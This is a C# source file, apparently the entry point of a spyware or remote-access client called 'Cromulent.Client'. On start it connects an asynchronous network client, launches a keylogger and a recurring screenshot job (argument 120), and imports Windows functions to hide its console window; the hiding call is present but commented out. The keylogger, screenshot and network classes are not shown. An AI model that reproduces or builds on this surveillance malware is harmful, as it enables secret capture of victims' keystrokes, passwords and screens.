using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using Cromulent.Client.Jobs;


namespace Cromulent.Client
{
    class Program
    {
        static void Main(string[] args)
        {
            var handle = GetConsoleWindow();

            // Hide
            //ShowWindow(handle, SW_HIDE);

            AsynchronousClient.StartClient();

            //Application.Run();
            KeyLogger k = new KeyLogger();
            k.Start();

            ScreenShot s = new ScreenShot();
            s.Start(120);

            Application.Run();

            k.Stop();
        }


        // The two dll imports below will handle the window hiding.
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
    }
}
